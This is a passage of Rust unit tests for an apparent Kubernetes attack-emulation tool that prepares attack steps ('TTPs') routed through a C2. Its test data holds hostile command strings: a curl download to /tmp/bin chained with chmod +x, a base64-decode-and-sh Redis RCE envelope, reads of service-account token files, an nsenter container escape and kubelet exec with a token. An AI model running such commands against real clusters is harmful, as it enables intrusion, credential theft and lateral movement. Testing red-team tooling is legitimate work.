            ExecuteActionRequest {
                action_id: "http-abstract".to_string(),
                target_id,
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: Some("curl".to_string()),
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare action with abstract http-request procedure");

    assert!(
        exec.procedure.command.starts_with("curl "),
        "http_request procedure should be materialized via curl tool: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure
            .command
            .contains("https://k8s-api.local/ssrr"),
        "materialized command should contain request URL: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_materializes_steps_fetch_with_headers_and_chmod() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let mut ttps = curl_armory().ttps().to_vec();
    ttps.push(Ttp {
        procedures: vec![Procedure {
            tool: Some("curl".to_string()),
            steps: Some(serde_json::json!([
                {
                    "fetch": {
                        "url": "https://k8s-api.local/download",
                        "to": "/tmp/bin",
                        "follow_redirects": true,
                        "headers": {
                            "Authorization": "Bearer abc"
                        }
                    }
                },
                {
                    "chmod": "+x /tmp/bin"
                }
            ])),
            ..Procedure::new("curl", "")
        }],
        ..Ttp::new("steps-abstract", "Steps Abstract", "Execution")
    });
    let armory = Armory::from_ttps(ttps);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "steps-abstract".to_string(),
                target_id,
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: Some("curl".to_string()),
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare action with abstract steps procedure");

    assert!(
        exec.procedure
            .command
            .contains("-H \"Authorization: Bearer abc\""),
        "materialized command should include fetch headers: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure.command.contains("-o '/tmp/bin'"),
        "materialized command should include fetch output path: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure.command.contains("&& chmod +x /tmp/bin"),
        "materialized command should chain chmod step: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_errors_when_no_exec_channel_in_graph() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    // No exec relations added

    let armory = minimal_armory("test-ttp");
    let result = campaign.prepare_action(action_request(&target_id, None), &armory);

    assert!(
        matches!(result, Err(ExecuteActionError::NoExecChannel(_))),
        "expected NoExecChannel error, got {:?}",
        result
    );
}

#[test]
fn prepare_action_respects_caller_supplied_exec_system_id() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    // No exec relations — would normally error, but caller supplies explicit backend

    let armory = minimal_armory("test-ttp");
    let exec = campaign
        .prepare_action(action_request(&target_id, Some("custom-backend")), &armory)
        .expect("explicit exec_system_id should bypass graph check");

    assert_eq!(exec.exec_system_id, "custom-backend");
}

#[test]
fn prepare_action_explicit_exec_source_entity_runs_from_that_system() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let source = Pod::new("entry-hall", "dungeon");
    let source_id = source.entity_id().0.clone();
    campaign.entities.insert_typed(source);

    let target = Pod::new("redis.10-244-1-7", "oopservability");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);
    push_relation(&mut campaign, &RceCanExec::new(&source_id, &target_id));

    let armory = minimal_armory("test-ttp");
    let exec = campaign
        .prepare_action(action_request(&target_id, Some(&source_id)), &armory)
        .expect("explicit source entity should be used as execution target");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(
        exec.target_id, target_id,
        "semantic target must be the requested target"
    );
    assert_eq!(
        exec.exec_entity(),
        source_id,
        "physical exec entity must be the supplied source"
    );
    assert_eq!(
        exec.args.get("TARGET_ID").map(String::as_str),
        Some(target_id.as_str())
    );
}

#[test]
fn prepare_action_lateral_effect_grounds_lowercase_src_with_explicit_source_entity() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let source = Pod::new("entry-hall", "dungeon");
    let source_id = source.entity_id().0.clone();
    campaign.entities.insert_typed(source);

    let target = Pod::new("redis.10-244-1-7", "oopservability");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);
    push_relation(&mut campaign, &RceCanExec::new(&source_id, &target_id));

    let armory = Armory::from_ttps(vec![Ttp {
        effects: vec!["rce.can-exec(${src}, ${TARGET_ID})".to_string()],
        procedures: vec![Procedure::new("shell", "id")],
        ..Ttp::new("lateral-test", "Lateral Test", "Lateral Movement")
    }]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "lateral-test".to_string(),
                target_id: target_id.clone(),
                exec_system_id: Some(source_id.clone()),
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare lateral action");

    let effect = exec.ttp.effects.first().expect("effect should exist");
    assert!(
        !effect.contains("${src}"),
        "lowercase src should be grounded, got: {}",
        effect
    );
    assert!(
        effect.contains(&source_id),
        "effect should include explicit source id, got: {}",
        effect
    );
}

// ---------------------------------------------------------------------------
// command-not-found → binary absent tests
// ---------------------------------------------------------------------------

fn nmap_exec_ttp(target_id: &str) -> ExecTtp {
    ExecTtp {
        id: "cmd-nmap".to_string(),
        ttp: Ttp {
            description: "scan".to_string(),
            ..Ttp::new("network-scan", "Network Scan", "Discovery")
        },
        procedure: Procedure::new("nmap", "nmap -sT -sV -F 10.244.0.0/24"),
        args: HashMap::new(),
        target_id: target_id.to_string(),
        exec_chain: vec![target_id.to_string()],
        exec_system_id: target_id.to_string(),
        auth_identity_id: None,
        started_at_ms: 0,
        output_transform: None,
        is_cleanup: false,
        reasoning: String::new(),
    }
}

fn command_not_found_event() -> TtpExecuted {
    TtpExecuted {
        id: "evt-1".to_string(),
        success: false,
        results: vec![],
        exit_code: 1,
        fail_reason: "command terminated with non-zero exit code: error executing command \
            [/bin/sh -lc nmap -sT -sV -F 10.244.0.0/24], exit code 127"
            .to_string(),
        session_connected: None,
    }
}

#[test]
fn command_not_found_marks_binary_absent_on_exec_system() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let cmd = nmap_exec_ttp(&target_id);
    let event = command_not_found_event();

    campaign.on_ttp_executed(&cmd, &event).unwrap();

    let sys = campaign.get_system_entity(&target_id).unwrap();
    assert_eq!(
        sys.entity().system().has_binary("nmap"),
        ran_domain::BinaryPresence::Absent,
        "nmap should be marked Absent after exit code 127"
    );
}

#[test]
fn command_not_found_in_output_with_exit_zero_marks_binary_absent_and_fails_step() {
    // Regression: some shells (busybox sh) swallow the exit code and return 0
    // even when the binary is missing. The "not found" message appears in the
    // results instead of fail_reason, and event.success = true.
    // The step must still be recorded as failed and the binary marked Absent.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let pod = Pod::new("redis-pod", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let mut cmd = nmap_exec_ttp(&target_id);
    cmd.procedure.tool = Some("curl".to_string());
    cmd.procedure.command = "curl -XPOST http://k8s-api/...".to_string();

    let event = TtpExecuted {
        id: "evt-1".to_string(),
        success: true,
        exit_code: 0,
        results: vec!["sh: 1: curl: not found".to_string()],
        fail_reason: String::new(),
        session_connected: None,
    };

    let processing = campaign.on_ttp_executed(&cmd, &event).unwrap();

    assert!(!processing.effective_success, "step must be marked failed");
    let record = campaign.get_execution_records().last().unwrap();
    assert!(!record.success, "execution record must show failure");

    let sys = campaign.get_system_entity(&target_id).unwrap();
    assert_eq!(
        sys.entity().system().has_binary("curl"),
        ran_domain::BinaryPresence::Absent,
        "curl must be marked Absent when 'not found' appears in output at exit 0"
    );
}

#[test]
fn command_not_found_does_not_overwrite_known_present_binary() {
    use ran_domain::BinaryPresence;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let mut pod = Pod::new("demo", "default");
    pod.system.set_binary("nmap", "/usr/bin/nmap");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let cmd = nmap_exec_ttp(&target_id);
    let event = command_not_found_event();

    campaign.on_ttp_executed(&cmd, &event).unwrap();

    // Present should be preserved — a single failure doesn't override confirmed presence
    let sys = campaign.get_system_entity(&target_id).unwrap();
    assert_eq!(
        sys.entity().system().has_binary("nmap"),
        BinaryPresence::Present("/usr/bin/nmap".to_string()),
        "confirmed Present should not be overwritten by a command-not-found failure"
    );
}

#[test]
fn command_not_found_marks_binary_absent_when_target_is_non_system_entity() {
    // Regression: when the target is a ServiceAccount (not a system entity),
    // the absent binary must be recorded on the pod that physically ran the command
    // (exec_chain), not silently dropped.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let pod = Pod::new("runner", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let sa_id = "ns/default/sa/my-sa".to_string();
    let mut cmd = nmap_exec_ttp(&sa_id);
    cmd.exec_chain = vec![pod_id.clone()];

    let event = command_not_found_event();
    campaign.on_ttp_executed(&cmd, &event).unwrap();

    let sys = campaign.get_system_entity(&pod_id).unwrap();
    assert_eq!(
        sys.entity().system().has_binary("nmap"),
        ran_domain::BinaryPresence::Absent,
        "absent binary must be recorded on the executing pod even when target is a SA"
    );
}

// ---------------------------------------------------------------------------
// binary grounding in hop-wrapped commands
// ---------------------------------------------------------------------------

/// Build an armory with a single TTP whose command uses a named binary.
fn armory_with_command(ttp_id: &str, command: &str, tool: Option<&str>) -> Armory {
    Armory::from_ttps(vec![Ttp {
        procedures: vec![Procedure {
            tool: tool.map(str::to_string),
            ..Procedure::new("shell", command)
        }],
        ..Ttp::new(ttp_id, "Test TTP", "Discovery")
    }])
}

#[test]
fn prepare_action_grounds_binary_against_target_for_direct_path() {
    // When targeting a pod directly, a non-standard binary path on that pod
    // should be substituted into the procedure command.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut target = Pod::new("victim", "default");
    target.system.set_binary("kubectl", "/tmp/kubectl");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let armory = armory_with_command("test-ttp", "kubectl get pods", None);
    let exec = campaign
        .prepare_action(action_request(&target_id, None), &armory)
        .expect("should prepare action");

    assert!(
        exec.procedure.command.starts_with("/tmp/kubectl"),
        "kubectl should be resolved to /tmp/kubectl, got: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_grounds_declared_tool_when_not_first_word() {
    // Regression: deploy_container uses `tool: kubectl` but the command starts
    // with `export TOKEN=...; echo '...' | kubectl apply`. The declared tool
    // must be grounded even when it is not the first word of the command.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut target = Pod::new("victim", "default");
    target.system.set_binary("kubectl", "/tmp/kubectl");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let cmd =
        "export TOKEN=abc; echo '{}' | kubectl apply --token=$TOKEN -f - && kubectl wait pod/foo";
    let armory = armory_with_command("test-ttp", cmd, Some("kubectl"));
    let exec = campaign
        .prepare_action(action_request(&target_id, None), &armory)
        .expect("should prepare action");

    assert!(
        exec.procedure.command.contains("/tmp/kubectl"),
        "kubectl should be resolved to /tmp/kubectl, got: {}",
        exec.procedure.command
    );
    assert!(
        !exec.procedure.command.contains(" kubectl ")
            && !exec.procedure.command.contains("| kubectl"),
        "bare kubectl should not remain in command, got: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_grounds_inner_binary_before_rce_envelope_wrapping() {
    // When a command is routed through an RCE hop (rce.can-exec), the inner
    // binary name must be resolved against the final target's binary map
    // BEFORE the RCE envelope is applied, so the embedded command references
    // the correct path (e.g. /tmp/kubectl, not bare kubectl).
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // Entry pod: C2 has direct exec into it.
    let entry = Pod::new("entry-pod", "default");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    // Redis pod: only reachable via RCE from entry-pod.
    // kubectl was dropped here at /tmp/kubectl.
    let mut redis_pod = Pod::new("redis-pod", "default");
    redis_pod.system.set_binary("kubectl", "/tmp/kubectl");
    let redis_id = redis_pod.entity_id().0.clone();
    campaign.entities.insert_typed(redis_pod);

    // RCE relation with envelope from entry → redis.
    let envelope = r#"redis-cli eval "$(echo ${CMD} | base64 -d | sh)" 0"#;
    let rce_rel = RceCanExec::new(&entry_id, &redis_id).with_envelope(envelope.to_string());
    push_relation(&mut campaign, &rce_rel);

    let armory = armory_with_command("test-ttp", "kubectl get pods -n default", None);
    let exec = campaign
        .prepare_action(action_request(&redis_id, None), &armory)
        .expect("should prepare action via RCE hop");

    // The final command should embed /tmp/kubectl (not bare kubectl) inside the
    // redis-cli envelope.
    assert!(
        exec.procedure.command.contains("/tmp/kubectl"),
        "kubectl should be resolved to /tmp/kubectl inside the RCE envelope, got: {}",
        exec.procedure.command
    );
    assert!(
        !exec.procedure.command.starts_with("kubectl"),
        "bare 'kubectl' should not be the outer command, got: {}",
        exec.procedure.command
    );
    // The C2 kubectl-execs into the entry pod, which then runs the RCE envelope.
    assert_eq!(
        exec.exec_entity(),
        entry_id,
        "C2 should exec into entry-pod"
    );
}

#[test]
fn prepare_action_wraps_kubelet_sink_with_ran_ws_envelope() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let attacker = Pod::new("entry-hall-pod", "default");
    let attacker_id = attacker.entity_id().0.clone();
    campaign.entities.insert_typed(attacker);
    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);

    let node = K8sNode::new("cplane-01");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let mut target = Pod::new("argocd-application-controller-0", "argocd");
    target.containers.push(Container {
        name: "main".to_string(),
        image: "argocd/controller".to_string(),
        volume_mounts: vec![],
    });
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);

    push_relation(
        &mut campaign,
        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id)
            .with_envelope("ran-ws --token abc.jwt.token -- ${CMD}")
            .with_output_transform(OutputTransformKind::JsonEnvelope),
    );
    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);

    let armory = armory_with_command(
        "test-kubelet-wrap",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        None,
    );
    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "test-kubelet-wrap".to_string(),
                target_id: target_id.clone(),
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare action through kubelet channel");

    assert!(
        exec.procedure
            .command
            .starts_with("ran-ws --token abc.jwt.token -- "),
        "expected ran-ws kubelet envelope, got: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure
            .command
            .contains("ran-ws --token abc.jwt.token -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"),
        "expected direct inner command in ran-ws envelope, got: {}",
        exec.procedure.command
    );
    assert!(
        !exec.procedure.command.contains("kubectl exec -n argocd"),
        "kubelet sink hop should not inject kubectl exec, got: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_builds_kubelet_sink_command_when_outer_envelope_missing() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let attacker = Pod::new("entry-hall-pod", "default");
    let attacker_id = attacker.entity_id().0.clone();
    campaign.entities.insert_typed(attacker);
    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);

    let node = K8sNode::new("cplane-01");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let mut target = Pod::new("argocd-application-controller-0", "argocd");
    target.containers.push(Container {
        name: "main".to_string(),
        image: "argocd/controller".to_string(),
        volume_mounts: vec![],
    });
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);

    // Historical edge shape: kubelet source relation exists but carries no
    // envelope metadata (e.g. from drop-ran-ws marker expansion).
    push_relation(
        &mut campaign,
        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id),
    );
    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);

    let armory = armory_with_command(
        "test-kubelet-fallback",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        None,
    );
    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "test-kubelet-fallback".to_string(),
                target_id: target_id.clone(),
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should build kubelet sink fallback command");

    assert!(
        exec.procedure.command.contains("ran-ws --url"),
        "expected ran-ws direct kubelet command, got: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure
            .command
            .contains("--token \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\""),
        "expected fallback ran-ws token sourcing from pod SA token, got: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure.command.contains(
            "/exec/argocd/argocd-application-controller-0/main?output=1&error=1&command="
        ),
        "expected kubelet exec endpoint for target pod, got: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure
            .command
            .contains("cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken"),
        "expected URL-encoded inner command, got: {}",
        exec.procedure.command
    );
    assert!(
        !exec.procedure.command.contains("kubectl exec -n argocd"),
        "fallback should avoid kubectl sink wrapping, got: {}",
        exec.procedure.command
    );
    assert_eq!(
        exec.output_transform,
        Some(c2::OutputTransform::JsonEnvelope),
        "kubelet fallback should set JSON envelope output transform"
    );
}

#[test]
fn prepare_action_with_caller_supplied_source_keeps_direct_execution_for_serviceaccount_target() {
    // Regression: when target is a ServiceAccount and caller provides an
    // explicit exec source pod, execution should stay on that source (legacy
    // behavior), not auto-route to a pod that uses the target SA.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let entry = Pod::new("entry-hall", "dungeon");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    let target_pod = Pod::new("argocd-application-controller-0", "argocd");
    let target_pod_id = target_pod.entity_id().0.clone();
    campaign.entities.insert_typed(target_pod);

    let sa = ServiceAccount::new("argocd-application-controller", "argocd");
    let sa_id = sa.entity_id().0.clone();
    campaign.entities.insert_typed(sa);
    push_relation(&mut campaign, &Uses::new(&target_pod_id, &sa_id));

    let armory = armory_with_command(
        "read-token",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        None,
    );
    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "read-token".to_string(),
                target_id: sa_id.clone(),
                exec_system_id: Some(entry_id.clone()),
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should route from caller-supplied source to SA pod");

    assert_eq!(exec.target_id, sa_id, "semantic target must stay the SA");
    assert_eq!(
        exec.exec_entity(),
        entry_id,
        "caller-selected source must stay the execution entity"
    );
    assert_eq!(
        exec.exec_chain,
        vec![entry_id.clone()],
        "non-system target with caller-supplied source should execute directly on source"
    );
}

#[test]
fn prepare_action_with_caller_supplied_source_keeps_direct_execution_for_node_target() {
    // Regression: node-proxy actions target a Node semantically but should run
    // on the caller-selected foothold pod. Do not require an exec-channel path
    // from source pod to node.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let entry = Pod::new("entry-hall", "dungeon");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    let node = K8sNode::new("cplane-01");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let armory = armory_with_command(
        "node-proxy-check",
        "kubectl get --raw /api/v1/nodes/${NODE}/proxy/pods",
        None,
    );

    let mut args = HashMap::new();
    args.insert("NODE".to_string(), "cplane-01".to_string());

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "node-proxy-check".to_string(),
                target_id: node_id.clone(),
                exec_system_id: Some(entry_id.clone()),
                auth_identity_id: None,
                procedure_id: None,
                args,
                reasoning: None,
            },
            &armory,
        )
        .expect("node target with caller source should execute from source pod");

    assert_eq!(
        exec.target_id, node_id,
        "semantic target must stay the node"
    );
    assert_eq!(
        exec.exec_entity(),
        entry_id,
        "caller-selected source must remain execution entity"
    );
    assert_eq!(
        exec.exec_chain,
        vec![entry_id.clone()],
        "node target should not force source->node exec-channel traversal"
    );
}

#[test]
fn prepare_action_exec_system_same_as_target_still_uses_channel_hops() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let entry = Pod::new("entry-hall", "dungeon");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    let redis = Pod::new("redis.10-244-1-7", "oopservability");
    let redis_id = redis.entity_id().0.clone();
    campaign.entities.insert_typed(redis);

    let rce_rel = RceCanExec::new(&entry_id, &redis_id)
        .with_envelope("redis-cli eval \"$(echo ${CMD} | base64 -d | sh)\" 0".to_string());
    push_relation(&mut campaign, &rce_rel);

    // Simulates frontend defaulting exec_system_id to target_id.
    let exec = campaign
        .prepare_action(
            action_request(&redis_id, Some(&redis_id)),
            &minimal_armory("test-ttp"),
        )
        .expect("should still resolve via channel path");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(
        exec.target_id, redis_id,
        "semantic target must be the requested redis pod"
    );
    assert_eq!(
        exec.exec_entity(),
        entry_id,
        "physical exec entity must be the first hop, not target pod directly"
    );
}

#[test]
fn prepare_action_local_command_fallback_uses_in_cluster_source_for_pod_target() {
    // Regression: when a procedure is marked local-command, prepare_action used
    // to fall back to direct Ran -> target pod execution. For pod targets, we
    // should execute from the current in-cluster foothold instead.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // C2 can exec into entry-hall directly.
    let entry = Pod::new("entry-hall", "default");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    // redis is a pod target (no direct C2 channel).
    let redis = Pod::new("redis.10-244-1-7", "oopservability");
    let redis_id = redis.entity_id().0.clone();
    campaign.entities.insert_typed(redis);

    // Local command procedure; without the fix this would run directly on redis.
    let armory = Armory::from_ttps(vec![Ttp {
        procedures: vec![Procedure {
            is_local_command: Some(true),
            ..Procedure::new("shell", "echo hi")
        }],
        ..Ttp::new("test-local-fallback", "Test Local Fallback", "Discovery")
    }]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "test-local-fallback".to_string(),
                exec_system_id: None,
                auth_identity_id: None,
                target_id: redis_id,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should route through in-cluster source");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(
        exec.exec_entity(),
        entry_id,
        "fallback should exec into entry-hall, not redis directly"
    );
}

// ---------------------------------------------------------------------------
// IP-placeholder → real pod identity merge tests
// ---------------------------------------------------------------------------

/// Build a minimal JWT with the given payload (no real signature).
fn make_test_jwt(payload_json: &str) -> String {
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use base64::Engine;
    let header = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256","typ":"JWT"}"#);
    let payload = URL_SAFE_NO_PAD.encode(payload_json);
    format!("{}.{}.fakesig", header, payload)
}

/// When a TTP runs against an IP-placeholder pod and the output contains a
/// service-account token that reveals the real pod name, all relations pointing
/// at the placeholder should be transplanted to the real pod entity.
#[test]
fn ip_placeholder_pod_merged_when_sa_token_reveals_real_name() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));

    // Set up the IP-derived placeholder pod (as if created by rDNS scan).
    let mut placeholder = Pod::new("backend-service.10-244-1-4", "prod");
    placeholder.system.ips.push("10.244.1.4".parse().unwrap());
    let placeholder_id = placeholder.entity_id();
    campaign.entities.insert_typed(placeholder);

    // Wire a k8s.can-exec relation C2 → placeholder.
    push_exec_edge(&mut campaign, BUILTIN_C2_ID, &placeholder_id.0);

    // Build a JWT whose claims name the real pod.
    let jwt = make_test_jwt(
        r#"{
        "kubernetes.io": {
            "namespace": "prod",
            "pod": {"name": "backend-xyzabc-123", "uid": "pod-uid-1"},
            "serviceaccount": {"name": "api-sa", "uid": "sa-uid-1"}
        },
        "sub": "system:serviceaccount:prod:api-sa"
    }"#,
    );

    let cmd = sample_exec_ttp(&placeholder_id.0, vec!["rawServiceAccountToken"]);
    let event = sample_event(&jwt);

    campaign.on_ttp_executed(&cmd, &event).unwrap();

    // Placeholder is gone.
    assert!(
        !campaign.entities.contains::<Pod>(&placeholder_id),
        "IP-placeholder pod should have been removed"
    );

    // Real pod exists with merged IP.
    let real_id = EntityId::new("ns/prod/pod/backend-xyzabc-123");
    let real_pod = campaign
        .entities
        .find::<Pod>(&real_id)
        .expect("real pod should exist after merge");
    assert!(
        real_pod
            .system
            .ips
            .iter()
            .any(|ip| ip.to_string() == "10.244.1.4"),
        "IP from placeholder should have been copied to real pod"
    );

    // The exec relation was transplanted to the real pod.
    let rels = campaign.graph.to_relation_summaries();
    let has_exec_to_real = rels
        .iter()
        .any(|r| r.name == "k8s.can-exec" && r.target_id == real_id.0);
    assert!(
        has_exec_to_real,
        "k8s.can-exec should now target the real pod"
    );

    let has_exec_to_placeholder = rels
        .iter()
        .any(|r| r.name == "k8s.can-exec" && r.target_id == placeholder_id.0);
    assert!(
        !has_exec_to_placeholder,
        "k8s.can-exec should no longer target the placeholder"
    );
}

/// When the real pod is already known in the campaign (discovered earlier via
/// the K8s API), running a TTP on the IP-placeholder should still merge the
/// placeholder into the known entity.
#[test]
fn ip_placeholder_merged_when_real_pod_already_in_campaign() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));

    // Pre-existing real pod (from K8s API discovery).
    let real_pod = Pod::new("backend-xyzabc-123", "prod");
    let real_id = real_pod.entity_id();
    campaign.entities.insert_typed(real_pod);

    // IP-derived placeholder (from rDNS scan, created later).
    let mut placeholder = Pod::new("backend-service.10-244-1-4", "prod");
    placeholder.system.ips.push("10.244.1.4".parse().unwrap());
    let placeholder_id = placeholder.entity_id();
    campaign.entities.insert_typed(placeholder);

    // Exec relation points at placeholder (from network-scan phase).
    push_exec_edge(&mut campaign, BUILTIN_C2_ID, &placeholder_id.0);

    let jwt = make_test_jwt(
        r#"{
        "kubernetes.io": {
            "namespace": "prod",
            "pod": {"name": "backend-xyzabc-123", "uid": "pod-uid-1"},
            "serviceaccount": {"name": "api-sa", "uid": "sa-uid-1"}
        },
        "sub": "system:serviceaccount:prod:api-sa"
    }"#,
    );

    let cmd = sample_exec_ttp(&placeholder_id.0, vec!["rawServiceAccountToken"]);
    let event = sample_event(&jwt);

    campaign.on_ttp_executed(&cmd, &event).unwrap();

    // Placeholder removed.
    assert!(
        !campaign.entities.contains::<Pod>(&placeholder_id),
        "IP-placeholder pod should have been removed"
    );

    // Real pod still exists and now carries the IP.
    let real_pod = campaign
        .entities
        .find::<Pod>(&real_id)
        .expect("real pod should survive");
    assert!(
        real_pod
            .system
            .ips
            .iter()
            .any(|ip| ip.to_string() == "10.244.1.4"),
        "IP should be merged into the pre-existing real pod"
    );

    // Exec relation transplanted.
    assert!(
        campaign
            .graph
            .to_relation_summaries()
            .iter()
            .any(|r| r.name == "k8s.can-exec" && r.target_id == real_id.0),
        "k8s.can-exec should target the real pod"
    );
}

// ---------------------------------------------------------------------------
// sys.node-name — placeholder node identity resolution tests
// ---------------------------------------------------------------------------

#[test]
fn sys_node_name_merges_placeholder_node_into_real_node_when_target_is_node() {
    // Setup: a pod escaped to a placeholder node.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    // Placeholder uses escape_<pod-name> format.
    let placeholder = K8sNode::new("escape_attacker");
    let placeholder_id = placeholder.entity_id().0.clone();
    campaign.entities.insert_typed(placeholder);
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &placeholder_id));
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &placeholder_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}".to_string()),
    );

    // Simulate on_ttp_executed: the escape already ran; now a follow-up
    // `hostname` command targeted at the placeholder node returns the real name.
    let cmd = sample_exec_ttp(&placeholder_id, vec!["sys.node-name"]);
    let event = sample_event("worker-node-1");

    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    // The real node entity should exist.
    let real_id = EntityId::new("node/worker-node-1");
    assert!(
        campaign.entities.contains::<K8sNode>(&real_id),
        "real node entity should exist after sys.node-name resolution"
    );

    // The placeholder should be gone.
    let stale_id = EntityId::new(&placeholder_id);
    assert!(
